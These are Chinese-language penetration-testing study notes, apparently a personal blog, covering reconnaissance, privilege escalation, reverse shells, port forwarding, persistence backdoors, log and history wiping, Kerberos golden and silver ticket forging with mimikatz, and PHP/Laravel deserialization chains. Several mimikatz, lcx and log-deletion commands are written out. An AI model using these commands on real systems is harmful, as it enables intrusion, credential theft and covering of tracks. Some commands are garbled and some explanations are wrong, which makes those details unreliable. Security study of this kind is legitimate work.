<p><strong>一、工具</strong><br>天眼查，whois，搜索引擎(sodan、zoomeye、fofa)，github，一些脚本工具，nmap，oneforall，Layer子域名挖掘机。。</p>
<p>nmap扫描原理：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/AspirationFlow/article/details/7694274">https://blog.csdn.net/AspirationFlow/article/details/7694274</a><br><strong>Nmap常用参数：</strong><br>6. <strong>-sL</strong>    列出指定网络上的每台主机（不发送任何报文到主机）。<br>7. <strong>-sn（-sP）</strong>    无端口扫描，探测目标是否可达（在局域网内，该扫描不会发送ICMP报文，而是会广播ARP报文）<br>8. <strong>–dns-servers</strong>    指定DNS服务器来进行端口扫描（指定一个或多个dns服务器可以扫描得更快）<br>9. <strong>-sT</strong>    TCP全链接扫描，主机会与目标端口进行三次握手，建立完整的TCP连接（扫描速度慢，网络流量大，容易被发现）<br>10. <strong>-sS</strong>    TCP、SYN扫描，主机向目标端口发送SYN报文，如果目标端口返回了<code>[ACK,SYN]</code>标识，主机就发送RST断开连接（这种扫描方式速度快，被广泛使用）<br>11. <strong>-sA</strong>    TCP、ACK扫描，主机向目标端口发送ACK报文，如果目标端口返回了RST，就说明目标端口是开放的（该方式可以用来绕过防火墙）<br>12. <strong>-sU</strong>    UDP扫描，通过向带你看发送UDP数据包来判断开启了哪些UDP服务（UDP扫描通常比TCP扫描慢，可以同时进行TCP、UDP扫描）<br>13. <strong>-P</strong>    设置端口扫描范围<br>14. <strong>–exclude-ports</strong>    排除不需要扫描的端口<br>15. <strong>-F</strong>    快速扫描（这里按照nmap内置的最常用的端口表进行扫描，扫描数量比默认的更少，时间也会更短一些）<br>16. <strong>-r</strong>    让扫描顺序按照由低到高 的顺序进行扫描（正常情况下，为了扫描效率，端口扫描的顺序是随机的）<br>17. <strong>-top-ports</strong>    扫描nmap的端口表里最常见的前n个端口<br>18. <strong>-sV</strong>    检测目标运行的服务版本<br>19. <strong>-O</strong>     检测目标的操作系统<br>20. <strong>–host-timeout</strong>    设置扫描一个目标所等待的最长时间<br>21. <strong>-v</strong>    提高输出信息的详细程度<br>22. <strong>-A</strong>    启动强力扫描模式（该模式下会默认启动操作系统检测和版本扫描）<br>23. <strong>-6</strong>    启用IPv6扫描</p>
<p><strong>nmap ：</strong><br>包含主机发现、端口扫描、版本侦测、操作系统侦测等功能。</p>
<ul>
<li><strong>-sn</strong> 只进行主机发现过程，不进行端口扫描等操作；</li>
<li><strong>-Pn</strong> 跳过主机发现过程，直接进行端口扫描等操作；</li>
<li><strong>-n</strong> 不使用DNS解析</li>
</ul>
<p><strong>主机发现原理：</strong> 向目标主机发送多个数据包来探测包，若收到其中一个回复，则说明目标主机是开启的；可以发 ICMP echo、TCP&#x2F;SYN&#x2F;ACK等<br><strong>端口扫描原理：</strong> </p>
<ul>
<li>TCP SYN：开启-ACK-RST，未开启-RST；</li>
<li></li>
</ul>
<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qqchaozai/article/details/102515046">https://blog.csdn.net/qqchaozai/article/details/102515046</a></p>
<ul>
<li>信息收集</li>
<li>根据收集到的信息判断是否存在可利用的漏洞</li>
<li>使用存在漏洞进行攻击</li>
<li>功能点测试</li>
</ul>
<h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10236">https://xz.aliyun.com/t/10236</a></p>
<ul>
<li>whois可以查询到域名注册信息；</li>
<li>ping检测可以查到域名对应的IP地址</li>
<li>nmap扫描目标地址开放的端口和服务</li>
<li>指纹识别，查看是否使用了存在漏洞的框架（指纹：可以用来定位目标的某些特征）</li>
<li>使用工具扫描（Nessus、AWVS），查看是否存在漏洞</li>
<li>如果存在漏洞，就可以用msf去打，拿到shell</li>
<li>拿到Meterpreter shell后将这个shell迁移到一个稳定的进程中，避免原来的目标应用关闭而断开连接</li>
<li>shell稳定后，可以执行一些命令来查询目标机的信息，如：操作系统版本，当前权限，是否开启防火墙，是否运行在虚拟机上，最近运行的时间等</li>
<li>可以查看登录主机的用户，以及抓取他们的密码（hashdump、Quarks PwDump、Windows Credentials Editor、Mimikatz）</li>
<li>功能点手动测试，对一些常用的路径进行探测，也可以对网站目录进行扫描</li>
</ul>
<p><em><strong>信息收集的内容：</strong></em><br>企业信息收集</p>
<ul>
<li>公司的域名、子域名、全资子公司、IP信息等</li>
<li>判断收集到子域名受否为泛解析，IP是否为真实IP，开放了哪些端口，web网站使用的框架，中间件，服务器操作系统等。</li>
</ul>
<p><strong>如何判断子域名泛解析？</strong><br>   任意构造一个三级域名，如果能正确解析，就存在泛解析</p>
<p><strong>判断是否使用cdn：</strong><br>ping一下目标域名，如果ping出来的域名和我ping的域名不一样，就说明使用cdn；<br>有的在线网站进行ping检测，如果ping出来多个IP地址，就说明使用了cdn；如果只有一个IP，就是真实IP；<br><a target="_blank" rel="noopener" href="http://ping.chinaz.com/www.zswater.com">http://ping.chinaz.com/www.zswater.com</a> &#x2F;&#x2F;全球ping<br><a target="_blank" rel="noopener" href="https://wepcc.com/">https://wepcc.com/</a> &#x2F;&#x2F;全球ping</p>
<p><strong>子域名收集方式：</strong></p>
<ul>
<li>子域名收集工具：OneForAll、子域名挖掘机、ksubdomain</li>
<li>在线子域名收集网站</li>
<li>github上一些别人已经收集好的子域名；</li>
<li>字典爆破</li>
<li>空间搜索引擎，如fofa、zoomeye、shodan （语法：domain:baidu.com）</li>
<li>google语法搜索(site:*.baidu.com)</li>
<li>利用脚本爬取网页代码中的子域名信息</li>
<li>IP反查</li>
<li>通过DNS A记录查询(<a target="_blank" rel="noopener" href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a>)</li>
<li>利用证书透明度收集子域<br>在一些证书查询网站，可以查得子域名的SSL证书<br>google： <a target="_blank" rel="noopener" href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a><br>certspotter：<a target="_blank" rel="noopener" href="https://sslmate.com/certspotter/api/">https://sslmate.com/certspotter/api/</a><br>spyse：<a target="_blank" rel="noopener" href="https://spyse.com/search/certificate">https://spyse.com/search/certificate</a><br>censys：<a target="_blank" rel="noopener" href="https://censys.io/certificates">https://censys.io/certificates</a></li>
</ul>
<p><strong>获取目标web信息：</strong></p>
<ul>
<li>收集web的框架信息：一些识别框架的在线网站(<a target="_blank" rel="noopener" href="https://fp.shuziguanxing.com),浏览器中的插件(wappalyzer),js中有可能会泄露框架相关信息,根据错误页面判断(thinkphp),whatweb/">https://fp.shuziguanxing.com），浏览器中的插件(wappalyzer)，js中有可能会泄露框架相关信息，根据错误页面判断(ThinkPHP)，whatweb</a></li>
<li>收集web目录信息：使用目录工具扫描(御剑、dirsearch、字典爆破)</li>
<li>收集敏感信息：使用工具收集js中的敏感信息(JSFinder)，注意观察网站内容有没有泄露扫描有用的信息</li>
<li>后台信息收集：通过目录扫描看有没有找到后台登录地址，通过已知的框架在网上查有没有默认后台地址，通过观察url特点看可不可以猜出后台地址</li>
</ul>
<p><strong>常用端口服务：</strong><br><img src="/./images/1647246435489.png" alt="enter description here">[shentou-1]<br><img src="/./images/1647246487545.png" alt="enter description here">[shentou-2]<br><img src="/./images/1647246507346.png" alt="enter description here">[shentou-3]</p>
<h3 id="二、提权方式"><a href="#二、提权方式" class="headerlink" title="二、提权方式"></a>二、提权方式</h3><p>提权方式可分为本地溢出提权，数据库提权，第三方软件提权，内核提权，权限配置不当等<br><strong>Windows提权</strong><br><em><strong>系统漏洞提权：</strong></em><br>   可以使用Windows系统漏洞进行提权；(Windows中的可执行程序有.com和.exe)；</p>
<ul>
<li>拿到shell后执行systeminfo查看主机的系统信息，看系统的版本，看打了哪些补丁，找到主机没有打补丁又可利用的权限提升漏洞；</li>
<li>然后可以通过msf进行提权（生成exe，上传到目标主机上，然后运行即可提权）</li>
</ul>
<p>常见提取漏洞：ms13_053，ms14_058，ms16_016，ms14-068(2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)等</p>
<p><strong>Linux提权</strong><br><em><strong>内核提权：</strong></em><br>   查看内核版本(uname -a)，使用searchsploit搜索符合版本的漏洞，将对应的exp上传到目标主机上，编译后执行即可提权。<br>   例如脏牛提权（CVE-2016-5195），当Linux内核大于2.6.22（2007发现，2016修复），低权限用户可以利用该漏洞在全版本的Linux系统上实现本地提权。<br><em><strong>权限配置不当提权：</strong></em><br>   例如SUID提权，就是某个程序执行时是以高权限运行的，比如root权限，当普通用户在运行这个程序的时候，就相当于拥有了root权限，就可以利用root权限执行命令；<br>用find命令查看SUID可执行的文件：<br><code>find / -per （-4000） 2&gt;/dev/null</code><br>find执行命令<br><code>touch aaa</code><br><code>find / -name aaa -exec &quot;whoami&quot; \</code></p>
<p>局限：</p>
<ul>
<li>只对二进制程序有效</li>
<li>只在程序执行过程中才能拥有高权限</li>
</ul>
<p><em><strong>数据库提权：</strong></em><br>例如UDF提权，在MySQL的 lib&#x2F;plugin 目录下创建一个udf.dll文件，在文件中定义一个sys_eval()函数，这个函数可以执行系统命令，从udf文件中引入自定义函数，这样就可以使用自定义函数执行命令了。</p>
<p>MOF提权，MOF文件每五秒就会执行一次，上传MOF文件，文件中写入的是创建新用户的命令，这样当文件执行的时候就会创建新用户。<br><em><strong>缓冲区溢出提权（git提权）</strong></em><br>原理：在没有栈保护的时候，可以覆盖栈帧的返回地址，然后控制函数流程，从而达到提权的目的。<br>执行<code>sudi git -p help</code>，在末尾输入<code>!/bin/bash</code></p>
<p><em><strong>sudo提权</strong></em><br>CVE-2019-14287，作用于sudo低于1.8.28的版本<br>执行在duso后面加上<code>-u#数字</code>就可以执行当前权限不能执行的命令（例如<code>sudo -u#数字 id[命令]</code>）</p>
<p>CVE-2021-3156，作用于sudo 1.9.0到1.9.5怕所有稳定版，1.8.2到1.8.31篇所有旧版本（未安装patch）</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>一、什么是反弹shell</strong><br>反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<p><strong>二、正向连接</strong><br>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。<br><strong>三、类型</strong><br>bash反弹、nc反弹、PHP反弹、python反弹、perl反弹、socat反弹、msf生成exe木马上传反弹</p>
<h3 id="端口转发、端口映射"><a href="#端口转发、端口映射" class="headerlink" title="端口转发、端口映射"></a>端口转发、端口映射</h3><p>  <strong>端口转发</strong>是将外网是一个端口的通信完全转发给内网一个地址的指定端口，只能实现外网到内网的单向通信（就是把外网中我们不能访问到的主机的端口，转发到一个我们能访问到的内网主机的端口上）。<br>  <strong>端口映射</strong>是将外网的一个端口完全映射给内网地址的指定端口，可以实现内外网的双向通信。（也就是说当外网用户访问外网端口时，其实就是在访问内网的指定端口提供的服务）</p>
<p><strong>端口转发的方式：</strong><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26547381">https://zhuanlan.zhihu.com/p/26547381</a></p>
<ol>
<li>SSH端口转发（双方通过SSH登录后，在SSH客户端与SSH服务端之间建立一个隧道，从而进行通信）<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26547381">https://zhuanlan.zhihu.com/p/26547381</a></li>
</ol>
<ul>
<li>本地端口转发（将发送给本地端口的请求转发到另一个目标地址的端口）<br> <code>ssh -L 本地网卡地址:本地端口:目标地址:目标端口</code></li>
<li>远程端口转发（将发送到远程端口的请求转发到目标地址的端口）<br> <code>ssh -R 远程网卡地址:远程端口:目标地址:目标端口</code></li>
<li>动态端口转发 （将本地向目标地址发起的请求先转发到另一个端口，再通过这个端口向目标地址发起请求）<br><code>ssh -D 本地网卡地址:本地端口</code></li>
<li>链式端口转发（在内外网的环境下，外网主机要访问内网主机，可以先通过本地端口转发，将请求发送到另一个端口，再通过这个端口将请求转发到能访问内网服务的远程主机上，再通过这个远程主机将请求转发给内网主机）<br> <code>ssh -L  ....</code><br> 再<code>ssh -R ....</code></li>
</ul>
<ol start="2">
<li>LCX端口转发工具（windows）<br>在公网主机上进行监听，命令<code>lcx.exe -listen 4444 6666</code>，意思是将公网主机4444端口的请求转发到6666端口；<br>在（一个只有webshell的）肉鸡上执行<code>lcx.exe -slave 公网ip 4444 肉鸡内网IP 3389</code>，意思是将肉鸡3389端口的流量都转发到公网主机的4444端口上；<br>当访问(公网IP)6666端口时，就可以远程连接到肉鸡上（进入内网）。</li>
</ol>
<h3 id="SOCKS5代理"><a href="#SOCKS5代理" class="headerlink" title="SOCKS5代理"></a>SOCKS5代理</h3><p><strong>1. 概述</strong>：socks5是一个传输层的代理协议（通过TCP&#x2F;IP进行通信），前端的请求数据包经过socks5服务器原封不动的转发给目标服务器（用于内部网络需要访问外部网络的情况下，例如国内翻墙访问国外网站）（要求：前端要有socks5的接口）；<br>    HTTP代理是通过HTTP协议进行通信，在转发请求数据包的过程中可能会修改其中的内容。</p>
<p><strong>2. 实现代理的方法：</strong></p>
<ul>
<li>MSF 代理模块建立<br> 获得meterpreter shell后，可以使用<code>auxiliary/server/socks_proxy </code>模块设置代理（设置版本为5）；<br> 设置好代理主机的IP和端口，把代理添加到<code>/etc/proxychains.conf</code>文件中，然后可以使用proxychains测试是否能访问到目标内网。</li>
<li>SSH建立SOCKS5代理<br>  使用SSH命令建立SOCKS5代理服务器，<code>ssh -f -N -D 指定绑定ip地址:指定监听端口 远程ssh服务器登录名@ssh服务器地址</code>(经过指定端口的代理请求数据会通过建立的ssh隧道转发到目标服务器上)<br>  -f 进入后台模式<br>  -N 不执行远程命令<br>  -D 指定本地“动态”应用程序级端口转发。(ssh将充当socks服务器)<br>  结束代理：找到SSH所运行的进程，结束进程即可结束代理。</li>
<li>使用python脚本</li>
</ul>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p><strong>Windows：</strong></p>
<ul>
<li>使用粘滞键后门进行权限维持(例如将Sethc.exe换成cmd.exe，就可以在未登录目标主机时调用cmd)；</li>
<li>在目标主机的startup目录写入一个反弹shell的脚本，只要目标机启动，就会自动执行脚本；</li>
<li>写计划任务</li>
<li>添加影子账户（在net user命令下看不到，只能在注册表里看到）；</li>
<li>Powershell权限维持，在受害机运行下载权限维持脚本的命令，本地开启监听就可以了</li>
<li>使用NC，在受害者的主机是上传NC，修改注册表将NC设为自启动，只要在自己的服务器上一直开启监听，那么每当受害者主机开机之后都会主动连接我们的服务器；（在自己的服务器上进行监听，在受害者的主机上执行nc命令，修改注册表，将nc连接命令设为自启动）</li>
<li>使用msf权限维持模块（persistence）生成后门并设置用户登录后自启动，当用户启动计算机就会反弹shell；（前提是先获得一个Meterpreter shell）</li>
</ul>
<p><strong>Linux：</strong></p>
<ul>
<li>使用msf权限维持模块（persistence）生成后门并设置用户登录后自启动；（前提是先获得一个Meterpretershell）</li>
<li>使用NC，在受害者的主机是上传NC，修改注册表将NC设为自启动，只要在自己的服务器上一直开启监听，那么每当受害者主机开机之后都会主动连接我们的服务器；（在自己的服务器上进行监听，在受害者的主机上执行nc命令，修改注册表，将nc连接命令设为自启动）</li>
<li>写计划任务</li>
<li>SSH后门（写SSH公钥(生成密钥对ssh-keygen -t rsa，向服务器写公钥，登录时用私钥连接 )</li>
<li>添加root户(通过修改passwd和shadow文件)</li>
</ul>
<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p><strong>Windows下</strong><br><a target="_blank" rel="noopener" href="https://blog.u1timate.me/archives/windows-hen-ji-qing-li">https://blog.u1timate.me/archives/windows-hen-ji-qing-li</a></p>
<ul>
<li>日志文件有系统日志，安全日志，应用程序日志</li>
<li>手动清除日志（开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志，win+R输入eventvwr.msc打开事件查看器，清楚操作痕迹）</li>
<li>使用工具清除（wevtuil，el枚举日志，cl删除日志）</li>
<li>msf自带的清除日志功能</li>
<li>当连接了目标机的3389端口后，会生成一个default.rdp文件，其中记录了远程连接的相关信息</li>
<li>删除‘最近使用文件’目录下所操作过的文件记录（C:\Users\Administrator\Recent），或执行命令<code>del /f /s /q “%userprofile%\Recent*.*</code></li>
</ul>
<p><strong>Linux下</strong><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13648156.html">https://www.cnblogs.com/xiaozi/p/13648156.html</a></p>
<ul>
<li>清除history历史命令记录<br>- 编辑history记录文件，删除不想被保存的历史命令（<code>history - r</code>删除当前会话历史记录，<code>history -c</code>删除内存中的所有命令历史，<code>rm .bash_history</code>删除历史文件中的内容）<br>- 利用vim特性删除历史命令（使用vim打开一个文件<code>vi test.txt</code>，设置vim不记录命令，vim会将历史命令记录保存在viminfo文件中<code>:set history=0</code>，打开命令记录文件<code>.bash_history</code>，编辑文件删除历史历史操作命令<code>vsp ~/.bash_history</code>，清楚保存<code>.bash_hostory</code>文件）<br>- 在vim中执行主机不想让别人看见的命令<br>- 修改配置文件<code>/etc/profile</code>，是系统不保存命令记录</li>
<li>清楚系统日志痕迹（&#x2F;var&#x2F;log&#x2F;btmp   记录所有登录失败信息，使用lastb命令查看；&#x2F;var&#x2F;log&#x2F;lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看；&#x2F;var&#x2F;log&#x2F;wtmp    记录所有用户的登录、注销信息，使用last命令查看；&#x2F;var&#x2F;log&#x2F;utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看；&#x2F;var&#x2F;log&#x2F;secure   记录与安全相关的日志信息；&#x2F;var&#x2F;log&#x2F;message  记录系统启动后的信息和错误日志）<br>- 清空日志文件（清除登录失败的记录，清除登录成功的记录，清除相关日志信息）<br>- 删除&#x2F;替换与当天日期或自己登录的IP相匹配的信息</li>
<li>清除web入侵痕迹（替换日志ip地址，清除部分相关日志）</li>
<li>隐藏远程SSH登录记录</li>
</ul>
<h2 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h2><ol>
<li>拿下目标战点的webshell后，然后将shell反弹到msf上，用msf生成一个木马，下载到目标机上，msf开启监听，目标机运行木马就可以了；</li>
<li>查看当前权限，对目标机进行提权</li>
<li>可以查看目标主机的系统信息、登录过的用户信息、是否在一个域中等</li>
<li>然后可以抓取登录用户的密码，运气好可能直接抓到administor的密码</li>
<li>可以查看路由表，是否有另外的网段，如果有另一个网段，那么就可能是他的内网网段，接着添加一条路由，然后设置代理，方便访问内网</li>
<li>然后进行横向渗透，进入内网后就可以通过目标主机去访问内网中的其他主机，去扫描收集他们开放的端口和系统版本等信息，寻找是否有可利用的漏洞等，步骤差不多，条件合适就可以拿下域成员以及域控主机。</li>
</ol>
<h3 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h3><p><a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a><br><a target="_blank" rel="noopener" href="https://www.modb.pro/db/186789">https://www.modb.pro/db/186789</a><br>Kerberos是一种计算机网络认证协议，能够为网络中通信的双方提供认证服务（当客户端发起请求后，需要进行一系列的身份认证，确定双方身份都没错之后才建立连接)。<br><strong>一、Kerberos协议组成：</strong></p>
<ul>
<li>客户端</li>
<li>服务端</li>
<li>密钥分发中心(KDC，Key Distribution Center)（krbtgt：KDC服务使用的服务帐户)</li>
<li>认证服务器AS：用来认证客户端的身份并发放客户用于访问TGS的TGT</li>
<li>票据授权票据TGT（Ticket Granting Ticket，票据授予票据)</li>
<li>票据授权服务器TGS（Ticket Granting Server)：用来发放身份认证票据（发放整个认证过程以及客户端访问服务端时所需要的服务授权票据，向客户端和服务端分别发放Session_Key)<br>（- 特定服务器SS）</li>
</ul>
<p><img src="/./images/1647088335739.png" alt="enter description here">[TGT-1]<br><strong>二、认证流程：</strong><br><img src="/./images/1646377635475.png" alt="enter description here">[kerberos-1]</p>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p>
<ol>
<li>概述：黄金票据(Golden Ticket)就是伪造TGT（只要有了高权限的TGT，就可以发送给TGS，从而获取任意服务的ST（可以说有了黄金票据就有了域内的最高权限））</li>
<li>制作黄金票据：</li>
</ol>
<ul>
<li>获取域名称：<code>net view /domain</code></li>
<li>mimikatz获取krbtgt账户的NTML-Hash值以及SID：<code>mimikatz &quot;lsadump::dcsync /domain:test666.com /user:krbtgt&quot;</code></li>
<li>使用mimikatz生成黄金票据：<code>kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</code>（SID去除最后一个<code>-</code>及后面的值。&#x2F;admin：伪造的用户名，&#x2F;domain：域名称，&#x2F;sid：SID值，注意是去掉最后一个-后面的值，&#x2F;krbtgt：krbtgt的HASH值，&#x2F;ticket：生成的票据名称）</li>
<li>使用mimikatz的Kerberos:ptt功能将黄金票据导入到内存中，然后就可以通过dir成功访问域控的共享文件夹。</li>
</ul>
<p>这种方式导入的Ticket默认在20分钟以内生效，过期了再次导入就可以了；<br>可以伪造任意用户，包括不存在的用户；<br>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</p>
<ol start="3">
<li>黄金票据的防御：</li>
</ol>
<ul>
<li>限制域管理员登录除域控制器和少数管理服务器以外的任何其他计算机，将所有其他权限委派给自定义管理员组</li>
<li>禁用krbtgt账户，并保存当前的密码以及以前的密码</li>
</ul>
<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><ol>
<li><p>概述：<br>  白银票据(Silver Tickets)就是伪造ST(Service Ticket)，由于TGT中已经限定了服务，所以白银票据就只能访问指定服务；<br>  利用服务端的账户密码hash直接生成ST，发给服务端进行验证，可以伪造客户端访问服务端的权限（，从而获取高权限的资源等）；</p>
</li>
<li><p>制作白银票据：</p>
</li>
</ol>
<ul>
<li>获取服务端账户密码的ntlm-hash值：<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</code></li>
<li>制作银票：<code>kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt</code>(&#x2F;domain：当前域名称，&#x2F;sid：SID值，&#x2F;target：目标主机，&#x2F;service：服务名称，&#x2F;rc4：目标主机的hash值，&#x2F;user：伪造的用户名，&#x2F;ppt：将生成的票据导入内存)</li>
<li>然后就可以使用dir（<code>dir \\OWA2010SP3.0day.org\c$</code>）访问服务端的共享文件夹</li>
</ul>
<p>服务示例：<br><img src="/./images/1647071537029.png" alt="enter description here">[ST-1]<br><strong>定位域控：</strong><br>命令<code>nslookup +域名</code></p>
<p><strong>MS14-068原理</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy_strive_2012/article/details/51698780">https://blog.csdn.net/zy_strive_2012/article/details/51698780</a><br>这是一个可以域内提权的漏洞，可以将普通用户权限提升为域管理员权限；<br>原理是通过客户端伪造高权限的PAC</p>
<ul>
<li>在客户端向KDC发起认证请求的数据包中，有一个<code>include-PAC</code>的标志，并且这个标志被设置为了false，所以在KDC返回的TGT中不包含PAC；</li>
<li>然后我们就可以自己构造PAC，微软规定PAC由User SID &amp; Group SID、和经过带有Server_Key、KDC_key的签名算法组成；但是实际上却允许使用任意签名算法，客户端指定哪种算法，KDC就会那种算法进行签名验证；所以可以构造高权限的User SID &amp; Group SID，使用不带key的MD5算法进行签名，只对SID进行MD5运算；</li>
<li>然后将PAC放在请求包中发送给TGS，这里因为TGT加密了，所以并没有放在TGT中；在构造请求包的过程中，使用客户端产生的一个随机数对PAC进行加密，并且将这个随机数也发送给TGS；</li>
<li>TGS收到请求包后会把PAC解密出来，并且验证身份信息为合法；还会把TGT也解密出来，得到CT_SK；然后TGS会使用服务端产生的key和CS之间key生成一个带key的签名替换到PAC后面，并且把CT_SK用客户端产生的随机数进行加密，从而组成一个新的TGT返回给客户端；</li>
<li>所以相当于是向TGS申请了一个带有PAC的TGT，然后再向KDC申请ST。</li>
</ul>
<p><em><strong>突破“本地账户才能利用”的限制</strong></em><br>  本地账户与域用户的区别在于，本地用户在使用mimikatz向内存注入缓存证书之前，内存中的缓存证书为0个，域用户在mimikatz注入之前缓存证书有4个；<br>  当要访问域控时，系统会先在缓存的证书中查找是否存在ST，不存在则寻找TGT，然后向KDC申请ST；<br>  而域用户本身就存在ST，所以就不用再申请，也就没有伪造的机会；那么只要把域用户中缓存的证书全部清除，就可以利用漏洞伪造PAC，生成高权限的TGT，然后申请到一个高权限的ST，这样就可以在域用户下提升为域管理员权限。</p>
<h2 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h2><p><strong>一、通用代码审计思路</strong></p>
<ul>
<li>逆向追踪，根据敏感关键字回溯参数传递过程</li>
<li>正向追踪，查找可控变量，跟踪变量传递过程</li>
<li>寻找敏感功能点，通读功能点代码</li>
<li>直接通读全文代码</li>
</ul>
<p><strong>二、审计方式</strong><br>黑盒测试：在不接触代码的情况下，在功能点测试系统有没有bug，是否满足设计需求；<br>白盒测试：直接从代码层面寻找是否有漏洞；<br>灰盒测试：介于白盒与黑盒之间的一种测试，灰盒测试多用于集成测试阶段，不仅关注输出，输入的正确性，同时也关注程序内部情况。</p>
<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p><img src="/./images/1641112675017.png" alt="enter description here">[serialize-1]<br><img src="/./images/1641112715397.png" alt="enter description here">[serialize-2]</p>
<p><strong>一、魔术方法</strong></p>
<ul>
<li>__construct()当一个对象创建时被调用</li>
<li>__destruct()当一个对象销毁时被调用</li>
<li>__toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用</li>
<li>__sleep() 在对象在被序列化之前运行</li>
<li>__wakeup将在序列化之后立即被调用</li>
</ul>
<p>一般是从<code>__destruct</code>方法入手，也就是当一个对象被销毁时会调用这个方法，跟踪该方法中调用到的其他方法，找到使用了危险函数的地方，判断参数是否可控，若可控，则传入恶意内容。</p>
<p><strong>二、__wakeup绕过</strong><br>对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。</p>
<p> <strong>三、PHP session工作流程</strong><br> 当开始一个会话时，PHP会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookie、Get、Post中不存在session id，PHP 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在http <code>response</code>中通过<code>set-cookie</code>头部发送给客户端保存。<br> <img src="/./images/1641797594396.png" alt="enter description here">[serialize-3]<br><strong>四、PHP session的存储机制</strong><br>PHP session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的，当然这个文件名也不是不变的，都是sess_sessionid形式<br><strong>五、session的反序列化漏洞利用</strong><br>当使用<code>php_serialize</code>处理器生成序列化结果时，存储格式中存在<code>|</code>，再使用<code>php</code>处理器取出时，<code>|</code>会被当成键值对的分隔符，在特定地方会造成反序列化漏洞。</p>
<h2 id="PHP漏洞分析"><a href="#PHP漏洞分析" class="headerlink" title="PHP漏洞分析"></a>PHP漏洞分析</h2><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><h4 id="框架特征"><a href="#框架特征" class="headerlink" title="框架特征"></a>框架特征</h4><h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p><em><strong>Laravel 5.7 反序列化RCE</strong></em><br>从<code>__destruct</code>方法看起，进入<code>run()</code>方法，又继续跟进，在<code>createABufferedOutputMock()</code>方法中，foreach对test类中的<code>expectedOutput</code>属性进行遍历，但是并不存在这个属性，所以当访问一个不存在的属性的时候会触发<code>__get()</code>方法，而<code>get()</code>方法中的<code>attributes</code>参数是可控的，所以我们可以构造键名为<code>expectedOutput</code>的数组，就可以顺利走出循环；<br>后面还有一个foreach循环也是同样的道理，构造键名为<code>expectedQuestions</code>的数组；<br>漏洞关键点在run()方法中调用的<code>call()</code>方法，这个方法又使用了<code>call_user_func()</code>，<code>$callback</code>参数可控，<br><em><strong>Laravel 5.8 反序列化RCE</strong></em><br>触发点在<code>dispatchToQueue()</code>方法，这个方式里面用到了<code>call_user_func</code>函数，并且<code>call_user_func</code>的两个参数是可控的；<br>第一个<code>queueResolver</code>参数会在调用<code>__condtruct</code>方法时被调用进来，可以将它赋为system；<br>第二个参数<code>$connection</code>是来自于<code>$command</code>，而<code>$command</code>需要继承于<code>ShouldQueue</code>接口，所以找一个继承于该接口的类，添加<code>$connection</code>变量，将值赋为恶意命令就可以了。</p>
